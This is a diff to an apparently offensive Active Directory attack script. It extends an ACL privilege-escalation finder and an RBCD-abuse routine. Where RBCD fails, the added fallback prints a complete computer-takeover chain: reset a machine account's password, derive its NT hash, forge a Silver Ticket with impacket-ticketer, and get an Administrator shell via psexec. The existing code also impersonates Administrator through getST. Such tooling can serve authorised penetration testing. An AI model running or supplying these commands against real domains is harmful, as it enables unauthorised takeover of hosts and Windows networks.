@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.49.8"
+readonly VERSION="1.49.9"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -2035,7 +2035,7 @@ try:
                 except Exception: pass
 except Exception: sys.exit(0)
 def short(s): return str(s or "").split("@")[0]
-objs=[]; owner_sid=None; groups=[]   # groups: (group_sid, [member_sids])
+objs=[]; owner_sid=None; owner_pg=None; owner_type=None; groups=[]   # groups: (gid, [member_sids])
 for fn,doc in data.items():
     low=fn.lower()
     typ=("User" if "users" in low else "Group" if "groups" in low else
@@ -2047,12 +2047,23 @@ for fn,doc in data.items():
         objs.append((sam,typ,o.get("Aces") or []))
         if typ=="Group":
             groups.append((oid,[m.get("ObjectIdentifier","") for m in (o.get("Members") or [])]))
-        if owner in (sam.lower(), short(props.get("name","")).lower()): owner_sid=oid
+        if owner in (sam.lower(), short(props.get("name","")).lower()):
+            owner_sid=oid; owner_type=typ
+            owner_pg=o.get("PrimaryGroupSID") or props.get("primarygroupsid")
 if not owner_sid: sys.exit(0)
 # Effective SIDs the owner holds = self + EVERY group it's a (transitive, nested)
-# member of + well-known Authenticated Users / Everyone. Without this we'd miss ACLs
-# delegated to a GROUP the user belongs to (a real, common privesc edge).
+# member of + its PRIMARY GROUP + well-known Authenticated Users / Everyone.
+# PRIMARY-GROUP membership is NOT in any group's Members[] (SharpHound models it via
+# primaryGroupID), so without this we miss ACLs delegated to Domain Computers (515,
+# every computer) / Domain Users (513, every user) — e.g. the pre-created-computer
+# → "Domain Computers --GenericWrite--> workstation" edge that hands you the host.
 mysids={owner_sid, "S-1-5-11", "S-1-1-0"}
+if owner_pg:
+    mysids.add(owner_pg)
+elif owner_sid.startswith("S-1-5-21"):
+    dsid=owner_sid.rsplit("-",1)[0]
+    if owner_type=="Computer": mysids.add(dsid+"-515")
+    elif owner_type=="User":   mysids.add(dsid+"-513")
 changed=True
 while changed:
     changed=False
@@ -4051,11 +4062,24 @@ _abuse_rbcd() {
     fi
 
     run "bloodyAD ${ba[*]} add rbcd '$target' '$deleg'"
-    bloodyAD "${ba[@]}" add rbcd "$target" "$deleg" 2>&1 | tee -a "$LOGFILE"
+    local rbout; rbout=$(bloodyAD "${ba[@]}" add rbcd "$target" "$deleg" 2>&1); echo "$rbout" | tee -a "$LOGFILE"
+    # RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) needs a 2012+ KDC. On a pre-2012
+    # DC (e.g. Server 2008 R2) the attribute/feature is absent → noSuchAttribute /
+    # INVALID_PARAMETER. Don't pretend it worked; point at the computer-takeover route.
+    if grep -qiE 'noSuchAttribute|INVALID_PARAMETER|will not perform|unwilling|not supported' <<<"$rbout"; then
+        warn "  RBCD unsupported on this DC (pre-2012 / Server 2008 R2 has no msDS-AllowedToActOnBehalfOfOtherIdentity)."
+        info "  → leverage FullControl over ${target} via COMPUTER TAKEOVER (reset its password → Silver Ticket → Administrator):"
+        detail "      bloodyAD ${ba[*]} set password '$target' 'MachinePwn123!'   # FullControl can set a computer's pw"
+        detail "      NT=\$(python3 -c \"import hashlib;print(hashlib.new('md4','MachinePwn123!'.encode('utf-16le')).hexdigest())\")"
+        detail "      SID=\$(bloodyAD ${ba[*]} get object '$DOMAIN' --attr objectSid | grep -oP 'S-1-5-21-[0-9-]+')"
+        detail "      impacket-ticketer -nthash \$NT -domain-sid \$SID -domain $DOMAIN -spn cifs/${target%\$}.${DOMAIN} Administrator"
+        detail "      KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass ${target%\$}.${DOMAIN}   # or wmiexec / RDP → RpcEptMapper → SYSTEM"
+        return 1
+    fi
     rb_record "Set RBCD on $target → $deleg" "bloodyAD ${ba[*]} remove rbcd '$target' '$deleg'"
     local svc="cifs/${target%\$}.${DOMAIN}"
     run "impacket-getST -spn $svc -impersonate Administrator <${deleg}>"
-    local stout; stout=$(impacket-getST -spn "$svc" -impersonate Administrator "${delcreds[@]}" -dc-ip "$DC_IP" -dc-host "$dch" 2>&1); echo "$stout" | tee -a "$LOGFILE"
+    local stout; stout=$(impacket-getST -spn "$svc" -impersonate Administrator "${delcreds[@]}" -dc-ip "$DC_IP" 2>&1); echo "$stout" | tee -a "$LOGFILE"
     local stfile; stfile=$(grep -oiP 'Saving ticket in \K\S+\.ccache' <<<"$stout" | head -1)
     if [[ -n "$stfile" && -f "$stfile" ]] && ! grep -qiE 'KDC_ERR|SessionError|does not have' <<<"$stout"; then
         local cc="$OUTDIR/rbcd_admin_${target%\$}.ccache"; mv -f "$stfile" "$cc" 2>/dev/null
